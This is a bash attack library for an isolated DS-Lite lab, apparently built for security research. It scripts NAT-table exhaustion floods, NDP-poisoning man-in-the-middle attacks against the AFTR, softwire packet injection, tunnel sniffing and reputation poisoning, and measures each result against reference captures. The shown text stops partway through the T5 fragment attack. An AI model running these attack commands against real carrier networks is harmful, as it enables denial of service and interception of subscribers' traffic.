#!/bin/bash
# attack_lib.sh - the SINGLE source of per-attack truth for the DS-Lite lab.
#
# Both the interactive runner (run_attack_live.sh, one narrated terminal) and the
# reference generator (capture_references.sh) source this file, so the live
# run and the stored ground-truth pcaps can never drift apart again.
#
# Per attack Tn this file provides three things:
#   spec_Tn   -> prints the capture points  "point|ns|iface|filter;..."
#   knobs_Tn  -> prints the curated knobs    "name:default|alt|...;..."
#   do_Tn     -> runs the attack from ONE shell, narrating each step, captures at
#                the spec points, measures the outcome signal, and sets:
#                  VERDICT_PASS (0/1), REF_LINE (expected), RUN_LINE (observed),
#                  CMDS_RUN (the exact command line(s) executed)
#
# Runs INSIDE the container, in the root netns; uses `ip netns exec` per device.
set -u

# ── topology constants (mirror setup.sh) ──────────────
C_PREFIX=2001:db8:cafe
AFTR=${C_PREFIX}::10
VB4=${C_PREFIX}::b41           # victim B4-1 softwire identity
B42=${C_PREFIX}::b42           # B4-2 softwire identity
ATK6=${C_PREFIX}::13a          # attacker, ISP carrier segment
SRV=198.51.100.2               # public Internet server
SHARED=192.0.2.1               # AFTR shared public IPv4
C1=10.0.1.100; GW1=10.0.1.1    # client1 (victim LAN host) + B4-1 gateway
C2=10.0.2.100; GW2=10.0.2.1    # client2 (other subscriber) + B4-2 gateway
T=/testbed/attack_tools
CAP_MAX=4000

nse() { ip netns exec "$@"; }
# nsd: start a netns process detached so it survives the do_Tn function (used by
# T8's off-path resolver scaffolding). setsid + redirected stdio so it does not
# hold the terminal or get reaped when the calling step returns.
nsd() { setsid ip netns exec "$@" </dev/null >/dev/null 2>&1 & }

# ── runtime discovery ──────────────────────────────────────────────────────
# The lab is NOT guaranteed to come up with the exact addresses the reference
# pcaps used: DHCP leases, softwire identities and pool ports can differ run to
# run. So we DISCOVER the live values and only fall back to the constants above.
# Every do_Tn and every measure filter uses these variables, so the attack and
# its success check adapt to whatever the lab actually assigned. Principle and
# outcome stay consistent even when the concrete IPs do not.
_addr4() { nse "$1" ip -4 -o addr show "$2" 2>/dev/null | awk '{print $4}' | cut -d/ -f1 | head -1; }
_addr6() { nse "$1" ip -6 -o addr show "$2" scope global 2>/dev/null | awk '{print $4}' | cut -d/ -f1 | grep -v '^fe80' | head -1; }
# softwire identity: the STABLE ::b4N address, NOT a DHCP lease / SLAAC addr.
_b4soft6() { nse "$1" ip -6 -o addr show "$2" scope global 2>/dev/null | awk '{print $4}' | cut -d/ -f1 | grep -E '::b4[0-9]$' | head -1; }
resolve_runtime() {
    local v
    v=$(_addr4 client1 eth0);          [ -n "$v" ] && C1="$v"
    v=$(_addr4 client2 eth0);          [ -n "$v" ] && C2="$v"
    v=$(_addr4 b4-1 eth-lan);          [ -n "$v" ] && GW1="$v"
    v=$(_addr4 b4-2 eth-lan);          [ -n "$v" ] && GW2="$v"
    # VB4/B42 = the ::b4N softwire identity (NOT the first global, which may be a
    # DHCPv6 lease) - otherwise reset_state points the tunnel at the wrong source.
    v=$(_b4soft6 b4-1 eth-isp);        [ -n "$v" ] && VB4="$v"
    v=$(_b4soft6 b4-2 eth-isp);        [ -n "$v" ] && B42="$v"
    v=$(_addr6 aftr eth-isp);          [ -n "$v" ] && AFTR="$v"
    v=$(_addr4 aftr eth-wan);          [ -n "$v" ] && SHARED="$v"
    v=$(_addr4 server eth0);           [ -n "$v" ] && SRV="$v"
}

# ── narration helpers (terse, one line per thing) ──────────────────────────
STEP=0
step() { STEP=$((STEP+1)); printf '  [%s] %s\n' "$STEP" "$*"; }
info() { printf '      %s\n' "$*"; }
note() { printf '  · %s\n' "$*"; }

# ── shared state hygiene (mirror run.sh reset_aftr_state / capture reset) ───
reset_state() {
    pkill -9 -f 'nat_hold|nat_exhaustion|ICMPv6ND_NA|tunnel_spoof|reputation_poisoning|pcp_attack|fragment_attack|dhcpv6_hijack|t4_softwire_inject|t7_peer_crosssub' 2>/dev/null
    # Heal the softwire: re-add the ::b4N source (a DHCPv6 hijack/renewal can flush
    # it or the exit-hook can rebuild the tunnel from a DHCP-leased addr), then
    # force the tunnel local back to the stable ::b4N identity the AFTR expects.
    nse b4-1 ip -6 addr add ${VB4}/64 dev eth-isp 2>/dev/null
    nse b4-2 ip -6 addr add ${B42}/64 dev eth-isp 2>/dev/null
    nse b4-1 ip -6 tunnel change ds-lite local ${VB4} remote $AFTR 2>/dev/null
    nse b4-2 ip -6 tunnel change ds-lite local ${B42} remote $AFTR 2>/dev/null
    nse b4-1 ip link set ds-lite mtu 1500 2>/dev/null
    nse b4-2 ip link set ds-lite mtu 1500 2>/dev/null
    nse b4-1 sh -c "echo 'aftr.dslite.example.com.' > /run/ds-lite-aftr-name" 2>/dev/null
    nse b4-2 sh -c "echo 'aftr.dslite.example.com.' > /run/ds-lite-aftr-name" 2>/dev/null
    nse aftr ip -6 neigh flush dev eth-isp 2>/dev/null
    nse aftr conntrack -F >/dev/null 2>&1
    # Re-assert the CGN conntrack timeouts setup.sh intends (RFC 6888 REQ-5: UDP
    # mapping >= 120s; here 300s). The per-netns nf_conntrack_* timeouts can drift
    # back to kernel defaults (udp=30s, syn_sent=120s) over the container's life,
    # which would make T1's SHOCK [UNREPLIED] entries GC in ~30s instead of the
    # documented ~300s. Re-asserting here keeps every run consistent with the docs.
    nse aftr sysctl -qw net.netfilter.nf_conntrack_udp_timeout=300 \
        net.netfilter.nf_conntrack_udp_timeout_stream=300 \
        net.netfilter.nf_conntrack_tcp_timeout_syn_sent=300 \
        net.netfilter.nf_conntrack_tcp_timeout_established=8640 2>/dev/null
    nse aftr nft flush chain ip nat pcp_dnat 2>/dev/null
    nse aftr nft flush meter ip filter per_b4_connlimit 2>/dev/null
    nse server-router nft flush chain ip filter forward 2>/dev/null
    # strip any victim ::b4N address leaked onto the attacker by a SIGKILLed
    # forged-source tool (see ensure_attacker_isp), so the next run starts clean
    local leaked
    for leaked in $(nse attacker ip -6 addr show dev eth-isp 2>/dev/null | grep -oE "${C_PREFIX}::b4[0-9]"); do
        nse attacker ip -6 addr del "${leaked}/128" dev eth-isp 2>/dev/null
        nse attacker ip -6 addr del "${leaked}/64"  dev eth-isp 2>/dev/null
    done
    # the SIEGE connection-sink must be alive for T1 phase 2
    _ensure_sink 2>/dev/null
    sleep 1
}

# uRPF / SAVI source validation. The forging attacks need it OFF to land (the
# default-vulnerable baseline the reference pcaps were captured under).
urpf() {
    local st="$1" i
    if [ "$st" = off ]; then
        nse aftr sysctl -qw net.ipv4.conf.all.rp_filter=0 >/dev/null 2>&1
        for i in $(nse aftr sh -c 'ls /proc/sys/net/ipv4/conf/' 2>/dev/null); do
            nse aftr sysctl -qw "net.ipv4.conf.$i.rp_filter=0" >/dev/null 2>&1
        done
        # NOTE: do NOT delete the SAVI bridge table here. uRPF (rp_filter) and
        # SAVI are two independent source-validation controls; deleting SAVI on
        # every forging-attack run silently disabled it, so a user who enabled
        # SAVI to test it against T2/T4/T5 saw the attack "succeed". The clean
        # vulnerable baseline is established by restore_lab (all defenses off),
        # not by each attack tearing SAVI down.
    else
        nse aftr sysctl -qw net.ipv4.conf.all.rp_filter=1 >/dev/null 2>&1
        for i in $(nse aftr sh -c 'ls /proc/sys/net/ipv4/conf/' 2>/dev/null); do
            nse aftr sysctl -qw "net.ipv4.conf.$i.rp_filter=1" >/dev/null 2>&1
        done
    fi
}

# Ensure the on-path attacker exists on the ISP carrier segment at ::13a.
# Idempotent: creates the netns + veth into br-isp if missing. Mirrors run.sh
# move_attacker(isp) so the runner is self-contained (no manual placement step).
ensure_attacker_isp() {
    ip netns add attacker 2>/dev/null || true
    if ! nse attacker ip link show eth-isp >/dev/null 2>&1; then
        ip link del eth-isp-atk 2>/dev/null || true
        ip link add eth-isp-atk type veth peer name atk-br 2>/dev/null
        ip link set eth-isp-atk mtu 1500; ip link set atk-br mtu 1500
        ip link set eth-isp-atk netns attacker
        nse attacker ip link set eth-isp-atk name eth-isp
        nse attacker ip link set eth-isp address 2a:29:47:aa:9c:56   # pinned MAC -> reproducible rogue-resolver link-local/SLAAC (paper Fig.1 & T9 capture)
        ip link set atk-br master br-isp
        ip link set atk-br up
        nse attacker ip link set lo up
        nse attacker ip link set eth-isp up
        nse attacker sysctl -qw net.ipv6.conf.eth-isp.accept_ra=1 2>/dev/null
        nse attacker ip -6 addr add ${ATK6}/64 dev eth-isp 2>/dev/null || true
        sleep 1
    fi
    # ALWAYS (re)assert the carrier-bridge config that lets the on-path attacker
    # see other subscribers' softwire frames. This MUST run even when the attacker
    # already exists (e.g. created by capture_references.sh's prov_attacker), or
    # the passive-sniff attacks (T3 interception, T5 IP-ID lock-on) capture nothing.
    # ageing_time 0 + flood on makes br-isp deliver unicast softwire frames to the
    # attacker port instead of only forwarding them between the B4 and AFTR ports.
    ip link set br-isp type bridge ageing_time 0 2>/dev/null
    bridge link set dev atk-br learning off flood on 2>/dev/null || true
    # SAFETY: a forged-source attack (nat_hold/nat_exhaustion tunnel mode) adds the
    # victim's ::b4N/128 to the attacker for NDP reachability and removes it on
    # exit - but a SIGKILL skips that, leaking ::b4N onto the attacker. If left, it
    # (a) duplicates the victim's address (breaks the victim's softwire) and
    # (b) makes _addr6/ATK6 resolve to the victim. Strip any such straggler.
    local leaked
    for leaked in $(nse attacker ip -6 addr show dev eth-isp 2>/dev/null | grep -oE "${C_PREFIX}::b4[0-9]"); do
        nse attacker ip -6 addr del "${leaked}/128" dev eth-isp 2>/dev/null
        nse attacker ip -6 addr del "${leaked}/64"  dev eth-isp 2>/dev/null
    done
    # make sure the attacker still has its own stable carrier address
    nse attacker ip -6 addr show dev eth-isp 2>/dev/null | grep -q "${C_PREFIX}::13a" || \
        nse attacker ip -6 addr add "${C_PREFIX}::13a/64" dev eth-isp 2>/dev/null
    # adopt the attacker's ACTUAL carrier address (discovered, not assumed),
    # but NEVER adopt a B4 softwire id even if one slipped through.
    local a; a=$(_addr6 attacker eth-isp)
    case "$a" in *::b4[0-9]) a="${C_PREFIX}::13a";; esac
    [ -n "$a" ] && ATK6="$a"
}

# ── capture control ────────────────────────────────────────────────────────
# start_caps <specs> <outdir> <prefix>   specs="point|ns|iface|filter;..."
CAP_PIDS=(); CAP_FILES=(); CAP_NAMES=()
start_caps() {
    local specs="$1" outdir="$2" prefix="$3"
    CAP_PIDS=(); CAP_FILES=(); CAP_NAMES=()
    local OIFS="$IFS" spec pt ns iff filt pf
    IFS=';'
    for spec in $specs; do
        IFS='|' read -r pt ns iff filt <<EOF
$spec
EOF
        [ -z "$pt" ] && continue
        pf="$outdir/${prefix}_${pt}.pcap"; rm -f "$pf"
        nse "$ns" timeout 30 tcpdump -ni "$iff" -U -s0 -c "$CAP_MAX" ${filt:+$filt} -w "$pf" >/dev/null 2>&1 &
        CAP_PIDS+=("$!"); CAP_FILES+=("$pf"); CAP_NAMES+=("$pt ($ns/$iff)")
        IFS=';'
    done
    IFS="$OIFS"
    sleep 1.5
}
stop_caps() {
    local p; for p in "${CAP_PIDS[@]}"; do kill "$p" 2>/dev/null; wait "$p" 2>/dev/null; done
    sleep 0.3
}
cap_summary() {  # prints "name file N pkts" for each capture
    local i n
    for i in "${!CAP_FILES[@]}"; do
        n=$(tcpdump -nr "${CAP_FILES[$i]}" 2>/dev/null | wc -l)
        printf '      %-34s %-34s %s pkts\n' "${CAP_NAMES[$i]}" "$(basename "${CAP_FILES[$i]}")" "$n"
    done
}

# ── measurement helpers ────────────────────────────────────────────────────
httpc() {  # httpc <ns> <url>  -> HTTP code (000 on failure; curl already prints 000)
    local c; c=$(nse "$1" curl -s -o /dev/null -w '%{http_code}' --max-time 4 "$2" 2>/dev/null)
    echo "${c:-000}"
}
ctcount() { nse aftr conntrack -C 2>/dev/null || echo 0; }
pcap_count() { tcpdump -nr "$1" "${2:-}" 2>/dev/null | wc -l | tr -d ' '; }

# Restart the AFTR PCP server with a clean (optionally smaller) pool so PCP
# exhaustion demos start from empty allocation state. Mirrors setup.sh launch.
restart_pcp() {
    local sz="${1:-1024}"
    nse aftr pkill -9 -f 'pcp_server.py' 2>/dev/null; sleep 0.3
    nse aftr nft flush chain ip nat pcp_dnat 2>/dev/null
    nse aftr sh -c "env PCP_POOL_SIZE=$sz python3 /testbed/aftr/pcp_server.py >/var/log/pcp-server.log 2>&1 &"
    sleep 1.2
}

# Restart the B4-1 PCP proxy from a clean client state, logging to a known file.
# The proxy's relayed-mapping table (its RFC 6887 8.5 epoch state) otherwise
# persists and grows across runs, so an ANNOUNCE renewal storm would reflect every
# mapping seeded since boot rather than this run's seed. Resetting it makes the TS3
# measurement deterministic. Mirrors the setup.sh launch (same log path).
B41_PROXY_LOG=/var/log/pcp-proxy-b4-1.log
reset_b4proxy() {
    pkill -9 -f "pcp_proxy.py --lan-ip $GW1" 2>/dev/null; sleep 0.4
    : > "$B41_PROXY_LOG" 2>/dev/null || true
    nse b4-1 sh -c "python3 /testbed/b4/pcp_proxy.py --lan-ip $GW1 --b4-ip6 $VB4 --aftr-ip6 $AFTR --passthrough-third-party >$B41_PROXY_LOG 2>&1 &"
    sleep 2
}

# Resolve a knob value: knob_val <NAME> <default>. Reads KNOB_<NAME> env if set.
knob_val() { local v="KNOB_$1"; echo "${!v:-$2}"; }

# Human attack names (kept in step with testbed/attack_corpus.txt).
attack_name() {
    case "$1" in
        T1) echo "NAT Binding-Table Exhaustion";;
        TS1) echo "Shared-IPv4 Reputation Poisoning";;
        T2) echo "Softwire Endpoint Spoofing & On-Path MITM";;
        T3) echo "Unencrypted-Tunnel Interception";;
        T4) echo "Downstream Softwire Injection";;
        T5) echo "Softwire Reassembly Poisoning";;
        TS2) echo "PCP Port-Exhaustion DoS";;
        T6) echo "Unauthorized THIRD_PARTY Forwarding";;
        TS3) echo "PCP ANNOUNCE Spoof (Epoch Reset)";;
        T7) echo "Cross-Subscriber PCP PEER + THIRD_PARTY";;
        T8) echo "B4 DNS Cache Poisoning";;
        T9) echo "Rogue AFTR Substitution";;
        T9b) echo "Transparent AFTR Hijack";;
        T10) echo "DS-Lite MIB Unauthenticated Access";;
        T11) echo "Unauthenticated Softwire Decapsulation";;
        T12) echo "Softwire Identity Multiplication";;
        *) echo "$1";;
    esac
}

# write_config <outdir> <id> - record exactly what ran + a live IP/MAC legend,
# so any pcap in the folder is readable. Self-contained legend writer.
write_config() {
    local outdir="$1" id="$2" f="$1/config.txt"
    {
        echo "DS-Lite live attack run - configuration & legend"
        echo "================================================="
        echo "attack    : $id  ($(attack_name "$id"))"
        echo "when (UTC): $(date -u +%Y-%m-%dT%H:%M:%SZ)"
        echo "knobs     : $(env | grep '^KNOB_' | sed 's/^KNOB_//' | sort | tr '\n' ' ')"
        echo "command(s):"
        printf '%s\n' "${CMDS_RUN:-(none recorded)}" | sed 's/^/    /'
        echo
        echo "verdict   : $([ "${VERDICT_PASS:-0}" = 1 ] && echo MATCH || echo DIFFERS)"
        echo "reference : ${REF_LINE:-}"
        echo "this run  : ${RUN_LINE:-}"
        echo "ground truth to compare against: pcaps/per_attack/$id/"
        echo
        echo "Path of a subscriber packet:"
        echo "  client (LAN) --IPv4--> B4 (CPE) --[IPv4-in-IPv6 softwire]--> AFTR (CGNAT) --IPv4--> server"
        echo
        printf "%-14s %-22s %-20s %s\n" "ROLE" "IPv4 / IPv6" "MAC" "WHERE"
        echo "(addresses below are the LIVE values discovered this run, not assumed)"
        printf "%-14s %-22s %-20s %s\n" "client1"  "${C1}"  "$(nse client1 cat /sys/class/net/eth0/address 2>/dev/null)"  "victim LAN host behind B4-1"
        printf "%-14s %-22s %-20s %s\n" "client2"  "${C2}"  "$(nse client2 cat /sys/class/net/eth0/address 2>/dev/null)"  "subscriber behind B4-2 (control)"
        printf "%-14s %-22s %-20s %s\n" "B4-1 ISP" "${VB4}" "$(nse b4-1 cat /sys/class/net/eth-isp/address 2>/dev/null)"  "B4-1 softwire endpoint (eth-isp)"
        printf "%-14s %-22s %-20s %s\n" "AFTR ISP" "${AFTR}"  "$(nse aftr cat /sys/class/net/eth-isp/address 2>/dev/null)"  "AFTR carrier side (eth-isp)"
        printf "%-14s %-22s %-20s %s\n" "AFTR WAN" "${SHARED}"    "$(nse aftr cat /sys/class/net/eth-wan/address 2>/dev/null)"  "AFTR public side, shared IPv4 (eth-wan)"
        printf "%-14s %-22s %-20s %s\n" "attacker" "${ATK6}" "$(nse attacker cat /sys/class/net/eth-isp/address 2>/dev/null)"  "on-path attacker, ISP carrier (eth-isp)"
        printf "%-14s %-22s %-20s %s\n" "server"   "${SRV}" "$(nse server cat /sys/class/net/eth0/address 2>/dev/null)"  "public Internet server"
    } > "$f"
}

# ─────────────────────────────────────────────────────────────────────────
# T1 - NAT Binding-Table Exhaustion (ISP forge path: fill victim B4's cap)
# ─────────────────────────────────────────────────────────────────────────
spec_T1() { echo "1-attacker-ISP|attacker|eth-isp|;2-AFTR-ISP-recv|aftr|eth-isp|;3-AFTR-WAN-postNAT|aftr|eth-wan|"; }
knobs_T1() { echo "intensity:fast|medium; target:$SRV"; }
# the SIEGE holds ESTABLISHED conns against a connection-sink; make sure the
# robust single-process holder is up (a fork-per-conn sink crashes under load).
_ensure_sink() {
    nse server sh -c "ss -lnt 2>/dev/null | grep -q ':6666 '" && return 0
    nse server pkill -9 socat 2>/dev/null
    nse server sh -c "setsid python3 /testbed/server/conn_sink.py 6666 >/dev/null 2>&1 &"
    sleep 0.6
}
do_T1() {
    local outdir="$1"
    local tgt; tgt=$(knob_val TARGET "$SRV")
    # intensity controls flood concurrency only; nat_exhaustion's --mode is always 'fast'
    local mode; mode=$(knob_val INTENSITY fast)
    local thr=4 batch=256; [ "$mode" = medium ] && { thr=2; batch=192; }
    urpf off; ensure_attacker_isp
    step "Surface: AFTR NAT/CGN connection table (RFC 6888 per-subscriber limit)."
    step "Baseline: real subscribers behind the two B4s reach the server."
    local v1b v2b; v1b=$(httpc client1 "http://$tgt/"); v2b=$(httpc client2 "http://$tgt/")
    info "client1 (behind victim B4-1) = HTTP $v1b   client2 (behind B4-2) = HTTP $v2b"
    nse aftr conntrack -F 2>/dev/null
    start_caps "$(spec_T1)" "$outdir" "T1"
    # ── Phase 1 SHOCK: flood unique half-open 5-tuples (instant but volatile) ──
    step "Phase 1 SHOCK: forge the victim B4 ($VB4), flood unique 4-in-6 connections to the per-subscriber limit."
    local cmd1="python3 $T/nat/nat_exhaustion.py eth-isp --tunnel --mode fast --src-ip6 $VB4 --aftr-ip6 $AFTR --inner-src-prefix 10.0.1.0/24 --dst-ip4 $tgt --threads $thr --batch $batch"
    nse attacker sh -c "timeout 7 $cmd1 >/dev/null 2>&1"
    nse attacker pkill -9 -f nat_exhaustion 2>/dev/null
    local ct_s unrep v1s; ct_s=$(ctcount); unrep=$(nse aftr conntrack -L 2>/dev/null | grep -c UNREPLIED); v1s=$(httpc client1 "http://$tgt/")
    info "connections=$ct_s ($unrep half-open) -> client1=$v1s.  Instant denial, but VOLATILE (half-open automatic cleanup ~300s)."
    nse aftr conntrack -F 2>/dev/null   # clear the volatile flood so the SIEGE fills with its own ESTABLISHED
    # ── Phase 2 SIEGE: hold real ESTABLISHED conns to the cap (durable, GC-proof) ──
    _ensure_sink
    step "Phase 2 SIEGE: complete + hold real completed conns to the per-subscriber limit (survives cleanup)."
    local cmd2="python3 $T/nat/nat_hold.py --tunnel --interface eth-isp --src-ip6 $VB4 --aftr-ip6 $AFTR --target $tgt --port 6666 --conns 2200 --threads 8 --inner-src-prefix 10.0.1.0/24"
    nse attacker sh -c "timeout 18 $cmd2 >/dev/null 2>&1" &
    sleep 12
    local ct_g est v1g v2g; ct_g=$(ctcount); est=$(nse aftr conntrack -L -p tcp 2>/dev/null | grep -c ESTABLISHED); v1g=$(httpc client1 "http://$tgt/"); v2g=$(httpc client2 "http://$tgt/")
    info "connections=$ct_g ($est completed held) -> client1=$v1g, client2(control)=$v2g.  DURABLE (completed survive automatic cleanup)."
    CMDS_RUN="attacker SHOCK: $cmd1
attacker SIEGE: $cmd2"
    stop_caps; cap_summary
    nse attacker pkill -f nat_hold 2>/dev/null; sleep 1   # SIGTERM: lets nat_hold remove its own /128
    nse attacker pkill -9 -f nat_hold 2>/dev/null          # force any straggler
    # strip any victim ::b4N the SIEGE tool may have leaked onto the attacker
    local leaked
    for leaked in $(nse attacker ip -6 addr show dev eth-isp 2>/dev/null | grep -oE "${C_PREFIX}::b4[0-9]"); do
        nse attacker ip -6 addr del "${leaked}/128" dev eth-isp 2>/dev/null
    done
    nse aftr conntrack -F 2>/dev/null   # heal
    REF_LINE="victim 200->000 in BOTH phases: SHOCK (half-open, volatile) + SIEGE (completed, durable); co-sub stays 200"
    RUN_LINE="SHOCK connections=$ct_s/$unrep half-open client1=$v1s ; SIEGE connections=$ct_g/$est completed client1=$v1g client2=$v2g"
    if [ "$v1b" = 200 ] && [ "$v1s" = 000 ] && [ "$v1g" = 000 ] && [ "$v2g" = 200 ]; then VERDICT_PASS=1; else VERDICT_PASS=0; fi
}

# ─────────────────────────────────────────────────────────────────────────
# T2 - Softwire Identity Takeover: NDP-poison the AFTR's cache for the victim B4
#      so its return traffic is delivered to the attacker (MITM) + victim DoS.
#      (Tree leaf: "True MITM: sustained NDP poison holds AFTR cache -> intercept + DoS")
# ─────────────────────────────────────────────────────────────────────────
spec_T2() { echo "1-poison-NAs|attacker|eth-isp|icmp6 and ip6[40]==136;2-attacker-intercept|attacker|eth-isp|ip6 proto 4 and ip6 src $AFTR;3-victim-cutoff|b4-1|eth-isp|ip6 proto 4"; }
knobs_T2() { echo "duration:15|25"; }
# AFTR's cached link-layer (MAC) for a neighbor IPv6 on the carrier segment
_neigh_mac() { nse aftr ip -6 neigh show dev eth-isp 2>/dev/null | grep -i "$1 " | grep -oE '([0-9a-f]{2}:){5}[0-9a-f]{2}' | head -1; }
do_T2() {
    local outdir="$1"
    local dur; dur=$(knob_val DURATION 15)
    urpf off; ensure_attacker_isp
    local amac; amac=$(nse attacker cat /sys/class/net/eth-isp/address 2>/dev/null | tr -d '\r\n')
    step "Surface: softwire RETURN path. The AFTR sends a B4's return traffic to"
    info  "whatever MAC its neighbor discovery cache maps the B4 IPv6 ($VB4) to. No neighbor discovery/RA guard."
    step "Baseline: victim reaches the server; AFTR maps $VB4 to the real B4."
    nse aftr ip -6 neigh flush dev eth-isp 2>/dev/null
    nse b4-1 ping6 -c1 -W1 "$AFTR" >/dev/null 2>&1; sleep 1
    local pre_mac v1b; pre_mac=$(_neigh_mac "$VB4"); v1b=$(httpc client1 "http://$SRV/")
    info "AFTR neighbor entry $VB4 -> $pre_mac    client1 = HTTP $v1b"
    start_caps "$(spec_T2)" "$outdir" "T2"
    step "Attack: attacker floods override neighbor-discovery messages ($VB4 -> attacker $amac) to take"
    info  "over the victim's softwire identity at the AFTR and steal its return path."
    local cmd="python3 $T/tunnel/tunnel_spoof.py mitm --interface eth-isp --src-ip6 $ATK6 --victim-b4-ip6 $VB4 --aftr-ip6 $AFTR --duration $dur --show-intercept"
    CMDS_RUN="attacker: $cmd"
    nsd attacker sh -c "$cmd >/tmp/t3.log 2>&1"
    sleep 4
    local mid_mac v1; mid_mac=$(_neigh_mac "$VB4"); v1=$(httpc client1 "http://$SRV/")
    step "Measure: AFTR neighbor entry $VB4 -> $mid_mac (attacker=$amac);  victim client1 = HTTP $v1"
    sleep 6
    stop_caps; cap_summary
    nse attacker pkill -f tunnel_spoof.py 2>/dev/null
    nse aftr ip -6 neigh flush dev eth-isp 2>/dev/null; nse b4-1 ping6 -c1 -W1 "$AFTR" >/dev/null 2>&1
    local stolen; stolen=$(pcap_count "$outdir/T2_2-attacker-intercept.pcap" "ip6 proto 4 and ip6 src $AFTR")
    info "victim return frames delivered to the attacker = $stolen"
    REF_LINE="AFTR neighbor entry for $VB4 flips to the attacker; victim 200->000; returns stolen"
    RUN_LINE="neighbor entry $pre_mac->$mid_mac, client1 $v1b->$v1, intercepted=$stolen"
    if [ "$mid_mac" = "$amac" ] && [ "$v1b" = 200 ] && [ "$v1" = 000 ]; then VERDICT_PASS=1; else VERDICT_PASS=0; fi
}

# ─────────────────────────────────────────────────────────────────────────
# TS1 - Shared-IPv4 Reputation Poisoning (collective punishment via shared IP)
# ─────────────────────────────────────────────────────────────────────────
spec_TS1() { echo "1-client-LAN|b4-1|eth-lan|;2-B4-softwire-uplink|b4-1|eth-isp|;3-AFTR-WAN-sharedIP|aftr|eth-wan|"; }
knobs_TS1() { echo "count:150|300; target:$SRV"; }
do_TS1() {
    local outdir="$1" tgt cnt; tgt=$(knob_val TARGET "$SRV"); cnt=$(knob_val COUNT 150)
    step "Surface: AFTR NAT/CGN. Every subscriber egresses under one shared IPv4 ($SHARED)."
    start_caps "$(spec_TS1)" "$outdir" "TS1"
    step "Attack: a malicious subscriber (client1 $C1) emits an abuse profile (spam/scan/flood)."
    local cmd="python3 $T/dns/reputation_poisoning.py --mode abuse --target $tgt --count $cnt"
    CMDS_RUN="client1: $cmd"
    nse client1 sh -c "timeout 14 $cmd >/dev/null 2>&1"
    stop_caps; cap_summary
    step "Measure: on the AFTR WAN side, what source IP does the abuse carry?"
    local wan abuse; wan="$outdir/TS1_3-AFTR-WAN-sharedIP.pcap"
    abuse=$(pcap_count "$wan" "src $SHARED")
    info "abuse packets egressing as the SHARED $SHARED = $abuse (blame lands on every co-subscriber)"
    REF_LINE="all abuse egresses as the shared $SHARED (collective reputation damage)"
    RUN_LINE="abuse packets sourced from $SHARED on the WAN = $abuse"
    [ "$abuse" -gt 0 ] && VERDICT_PASS=1 || VERDICT_PASS=0
}

# ─────────────────────────────────────────────────────────────────────────
# T3 - Unencrypted-Tunnel Interception (on-path reads subscriber plaintext)
# ─────────────────────────────────────────────────────────────────────────
spec_T3() { echo "1-victim-softwire|b4-1|eth-isp|ip6 proto 4;2-attacker-reads|attacker|eth-isp|ip6 proto 4"; }
knobs_T3() { echo "requests:6|12; target:$SRV"; }
do_T3() {
    local outdir="$1" tgt n; tgt=$(knob_val TARGET "$SRV"); n=$(knob_val REQUESTS 6)
    ensure_attacker_isp
    step "Surface: Softwire carries inner IPv4 in CLEARTEXT (no encryption)."
    start_caps "$(spec_T3)" "$outdir" "T3"
    step "Attack: passive - attacker ($ATK6) sniffs the carrier; victim browses meanwhile."
    local cmd="for i in \$(seq 1 $n); do curl -s -o /dev/null --max-time 4 http://$tgt/; sleep 0.5; done"
    CMDS_RUN="attacker: passive tcpdump ip6 proto 4 on eth-isp
client1 (victim traffic): $cmd"
    nse client1 sh -c "timeout 18 sh -c '$cmd' >/dev/null 2>&1"
    stop_caps; cap_summary
    step "Measure: can the attacker read the victim's inner traffic off the unencrypted softwire?"
    local apcap flows clear; apcap="$outdir/T3_2-attacker-reads.pcap"
    # the softwire is unencrypted, so tcpdump decodes the inner IPv4 5-tuple
    flows=$(tcpdump -nr "$apcap" 2>/dev/null | grep -cE "IP $C1\.[0-9]+ > $tgt\.(80|443)")
    clear=$(tcpdump -nr "$apcap" -A 2>/dev/null | grep -caiE 'GET /|HTTP/1|Host:')
    info "victim inner web flows ($C1 -> $tgt:80/443) the attacker can read = $flows"
    info "plaintext HTTP payload markers recovered = $clear"
    REF_LINE="attacker reads the victim's inner web flow in cleartext off the softwire (>0)"
    RUN_LINE="readable inner web-flow packets = $flows, plaintext HTTP markers = $clear"
    [ "$flows" -gt 0 ] && VERDICT_PASS=1 || VERDICT_PASS=0
}

# ─────────────────────────────────────────────────────────────────────────
# T4 - Downstream Softwire Injection (forge AFTR->B4, land on victim LAN)
# ─────────────────────────────────────────────────────────────────────────
spec_T4() { echo "1-attacker-forges|attacker|eth-isp|ip6 proto 4;2-injected-into-LAN|b4-1|eth-lan|"; }
# count defaults to 120: the injection is one sub-second sendp burst; a 15-packet
# burst can slip past the ~1.5s capture-attach window (start_caps) and read as a
# spurious 0 on the LAN pcap (~18/20). 120 reliably overlaps the capture (20/20).
knobs_T4() { echo "count:120|30; spoof:203.0.113.66"; }
do_T4() {
    local outdir="$1" cnt spoof; cnt=$(knob_val COUNT 120); spoof=$(knob_val SPOOF 203.0.113.66)
    urpf off; ensure_attacker_isp
    step "Surface: Softwire downstream. AFTR->B4 direction is also unauthenticated."
    start_caps "$(spec_T4)" "$outdir" "T4"
    step "Attack: attacker forges AFTR ($AFTR) -> B4 ($VB4) carrying inner src $spoof -> $C1."
    info "the B4 decapsulates it straight onto the victim LAN, bypassing the CGN."
    local cmd="python3 $T/infra/t4_softwire_inject.py --iface eth-isp --aftr $AFTR --b4 $VB4 --lan-host $C1 --spoof-src $spoof --count $cnt"
    CMDS_RUN="attacker: $cmd"
    nse attacker sh -c "timeout 12 $cmd >/dev/null 2>&1"
    stop_caps; cap_summary
    step "Measure: do forged packets (src $spoof) appear on the victim LAN?"
    local lan inj; lan="$outdir/T4_2-injected-into-LAN.pcap"
    inj=$(pcap_count "$lan" "src $spoof")
    info "injected packets with spoofed src $spoof seen on B4-1 LAN = $inj"
    REF_LINE="forged inner-IPv4 (src $spoof) bypasses the CGN and reaches the victim LAN (>0)"
    RUN_LINE="spoofed-src packets delivered onto B4-1 LAN = $inj"
    [ "$inj" -gt 0 ] && VERDICT_PASS=1 || VERDICT_PASS=0
}

# ─────────────────────────────────────────────────────────────────────────
# T5 - Softwire Reassembly Poisoning (predictable-IP-ID fragment injection;
#      Gilad & Herzberg 2013: spoofed fragments sharing the victim's reassembly
#      four-tuple collide with its genuine fragments at the AFTR -> victim DoS)
# ─────────────────────────────────────────────────────────────────────────
spec_T5() { echo "1-attacker-preseed|attacker|eth-isp|ip6 proto 4;2-aftr-collide|aftr|eth-isp|ip6 proto 4"; }
knobs_T5() { echo "band:64|48; target:$SRV"; }
do_T5() {
    local outdir="$1" band tgt; band=$(knob_val BAND 64); tgt=$(knob_val TARGET "$SRV")
    urpf off; ensure_attacker_isp
